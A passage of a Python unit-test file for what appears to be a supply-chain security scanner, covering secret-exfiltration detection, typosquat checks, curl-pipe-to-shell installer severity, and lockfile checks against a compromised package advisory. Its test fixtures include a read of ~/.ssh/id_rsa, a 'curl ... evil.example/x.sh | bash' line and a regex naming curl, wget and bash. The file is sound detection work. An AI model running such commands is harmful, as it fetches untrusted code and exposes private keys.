            self.assertTrue(S.SECRET_PATHS.search(text), text)
            fs = findings_of(S.check_secrets_and_network, "src/index.js", text, set())
            self.assertTrue(any(f["check"] == "secret-exfil" for f in fs), (text, fs))

    def test_source_id_rsa_still_flags(self):
        fs = findings_of(S.check_secrets_and_network, "src/keys.js", 'fs.readFileSync("/home/u/.ssh/id_rsa")\n', set())
        self.assertTrue(any(f["check"] == "secret-exfil" for f in fs), fs)


class TypoScopeAndNormalize(unittest.TestCase):
    def test_scoped_not_compared_to_unscoped_popular(self):
        for name in (
            "@modelcontextprotocol/server",
            "@dotenvx/dotenvx",
            "@codemirror/view",
            "@playwright/test",
        ):
            self.assertIsNone(S.typo_of(name, S.POPULAR_NPM), name)

    def test_pypi_name_normalization(self):
        self.assertEqual(S.normalize_pkg_name("typing_extensions"), S.normalize_pkg_name("typing-extensions"))
        self.assertIsNone(S.typo_of("typing_extensions", S.POPULAR_PYPI))
        self.assertIsNone(S.typo_of("typing-extensions", S.POPULAR_PYPI))

    def test_unscoped_typo_still_detected(self):
        hit = S.typo_of("reqeusts", S.POPULAR_PYPI)
        self.assertIsNotNone(hit)
        self.assertEqual(hit[0], "requests")


class OfficialInstallerAndMentions(unittest.TestCase):
    def test_official_installers_are_info_outside_readme(self):
        cases = [
            ("install.sh", "curl -LsSf https://astral.sh/uv/install.sh | sh\n"),
            ("setup.sh", "curl -fsSL https://claude.ai/install.sh | bash\n"),
            ("Dockerfile", "RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y\n"),
        ]
        for path, text in cases:
            fs = findings_of(S.check_shell_and_docker, path, text)
            self.assertTrue(fs, (path, text))
            self.assertEqual({f["severity"] for f in fs}, {"info"}, (path, fs))

    def test_readme_nodesource_stays_low(self):
        text = "curl -fsSL https://deb.nodesource.com/setup_22.x | bash -\n"
        fs = findings_of(S.check_shell_and_docker, "README.md", text)
        self.assertEqual({f["severity"] for f in fs}, {"low"}, fs)

    def test_ci_workflow_is_info(self):
        text = 'run: curl -fsSL https://claude.ai/install.sh | bash\n'
        fs = findings_of(S.check_shell_and_docker, ".github/workflows/ci.yml", text)
        self.assertEqual({f["check"] == "curl-pipe" and f["severity"] or None for f in fs} - {None, False}, {"info"}, fs)
        text = 'run: curl -fsSL https://claude.ai/install.sh?v=$CLAUDE_VERSION | bash\n'
        fs = findings_of(S.check_shell_and_docker, ".github/workflows/ci.yml", text)
        sevs = {f["severity"] for f in fs if f["check"] == "curl-pipe"}
        self.assertEqual(sevs, {"info"}, fs)

    def test_vendor_github_release_is_info(self):
        S._SCAN_CTX.owner = "astral-sh"
        try:
            text = "curl -fsSL https://github.com/astral-sh/uv/releases/download/0.4.0/uv-installer.sh | sh\n"
            fs = findings_of(S.check_shell_and_docker, "install.sh", text)
            self.assertEqual({f["severity"] for f in fs}, {"info"}, fs)
        finally:
            S._SCAN_CTX.owner = None

    def test_pipe_mentions_are_ignored(self):
        prose = "Block patterns like curl|bash, download/execute from untrusted hosts.\n"
        fs = findings_of(S.check_shell_and_docker, "src/policy.md", prose)
        self.assertFalse(any(f["check"] == "curl-pipe" for f in fs), fs)
        alt = "const BAD = /wget|python-requests|httpx|curl|bash/;\n"
        fs = findings_of(S.check_shell_and_docker, "src/classify.ts", alt)
        self.assertFalse(any(f["check"] == "curl-pipe" for f in fs), fs)

    def test_unknown_host_pipe_stays_high(self):
        fs = findings_of(S.check_shell_and_docker, "install.sh", "curl -fsSL https://evil.example/x.sh | bash\n")
        self.assertTrue(any(f["check"] == "curl-pipe" and f["severity"] == "high" for f in fs), fs)


class LockfileResolution(unittest.TestCase):
    SOL = {"id": "MAL-2025-1", "affected": [{"package": {"name": "@solana/web3.js"}, "ranges": [
        {"type": "SEMVER", "events": [{"introduced": "1.95.6"}, {"fixed": "1.95.8"}]}
    ]}]}

    def _run(self, version, lock_versions):
        orig = S.osv_query
        S.osv_query = lambda e, n, v=None: [self.SOL]
        try:
            out = []
            S.check_typos_and_osv(
                [("dependencies", "@solana/web3.js", version)],
                "npm", out, file="package.json", lock_versions=lock_versions,
            )
            return out
        finally:
            S.osv_query = orig

    def test_no_lock_still_flags_range(self):
        out = self._run("^1.95.0", None)
        self.assertTrue(any("lockfile not checked" in f["detail"] for f in out), out)
        self.assertTrue(any(f["severity"] == "medium" for f in out), out)

    def test_lock_safe_version_clears_range(self):
        # A safe repo pin is still reported as low: npx/npm i -g resolve the range fresh.
        out = self._run("^1.95.0", {"@solana/web3.js": ["1.95.5"]})
        self.assertTrue(any(f["check"] == "osv" and f["severity"] == "low" for f in out), out)
        self.assertTrue(any("MAL-2025-1" in f["detail"] for f in out), out)

    def test_lock_compromised_version_flags_high(self):
        out = self._run("^1.95.0", {"@solana/web3.js": ["1.95.6"]})
        self.assertTrue(any(f["check"] == "osv" and f["severity"] == "high" for f in out), out)

    def test_lock_missing_package_does_not_flag(self):
        out = self._run("^1.95.0", {"axios": ["1.7.0"]})
        self.assertTrue(any("lockfile not checked" in f["detail"] for f in out), out)
        self.assertTrue(any("MAL-2025-1" in f["detail"] for f in out), out)

    def test_exact_pin_still_flags_without_lock(self):
        out = self._run("1.95.6", None)
        self.assertTrue(any(f["severity"] == "high" for f in out), out)

    def test_parse_package_lock(self):
        text = (
            '{\n'
            '  "packages": {\n'
            '    "": {"name": "app", "version": "1.0.0"},\n'
            '    "node_modules/@solana/web3.js": {"version": "1.95.5"}\n'
            '  }\n'
            '}\n'
        )
        vers = S.parse_lockfile("package-lock.json", text)
        self.assertIn("1.95.5", vers.get("@solana/web3.js") or [])

    def test_parse_yarn_pnpm_poetry_uv(self):
        yarn = S.parse_lockfile("yarn.lock", '# yarn lockfile v1\n"@solana/web3.js@^1.95.0":\n  version "1.95.5"\n')
        self.assertIn("1.95.5", yarn.get("@solana/web3.js") or [])
        pnpm = S.parse_lockfile(
            "pnpm-lock.yaml",
            "lockfileVersion: '9.0'\npackages:\n  /@solana/web3.js@1.95.5:\n    resolution: {}\n",
        )
        self.assertIn("1.95.5", pnpm.get("@solana/web3.js") or [])
        poetry = S.parse_lockfile("poetry.lock", 'name = "requests"\nversion = "2.28.0"\n')
        self.assertIn("2.28.0", poetry.get("requests") or [])
        uv = S.parse_lockfile("uv.lock", 'name = "typing-extensions"\nversion = "4.12.0"\n')
        self.assertIn("4.12.0", uv.get("typing-extensions") or [])
        self.assertTrue(S.resolved_lock_versions(uv, "typing_extensions"))

    def test_lock_versions_walk_up_tree(self):
        locks = {"": {"axios": ["1.7.0"]}}
        self.assertEqual(S.lock_versions_for("packages/foo/package.json", locks), {"axios": ["1.7.0"]})
        self.assertIsNone(S.lock_versions_for("package.json", {}))


class PartialAndTimeout(unittest.TestCase):
    def test_capped_clean_scan_is_partial(self):
        out = S.finalize_status({"fetch_failed": []}, [], truncated=True)
        self.assertEqual(out["status"], "partial")
        self.assertTrue(out["truncated"])

    def test_hard_failure_stays_incomplete(self):
        fs = [S.finding("repo", "repository is not reachable", "info")]
        out = S.finalize_status({"fetch_failed": []}, fs, incomplete=True)
        self.assertEqual(out["status"], "incomplete")

    def test_fetch_failed_is_incomplete(self):
        out = S.finalize_status({"fetch_failed": ["package.json"]}, [], truncated=False, incomplete=True)
        self.assertEqual(out["status"], "incomplete")

    def test_medium_finding_stays_concerns_when_truncated(self):
        fs = [S.finding("osv", "range admits a compromised release", "medium")]
        out = S.finalize_status({"fetch_failed": []}, fs, truncated=True)
        self.assertEqual(out["status"], "concerns")

    def test_timeout_cli_flag(self):
        only, dry, out_dir, jobs, max_files, timeout = S.parse_args(
            ["--only=firefly-iii-api", "--timeout=600", "--jobs=1"], {"firefly-iii-api"}
        )
        self.assertEqual(timeout, 600)
        self.assertEqual(only, ["firefly-iii-api"])
        self.assertEqual(jobs, 1)
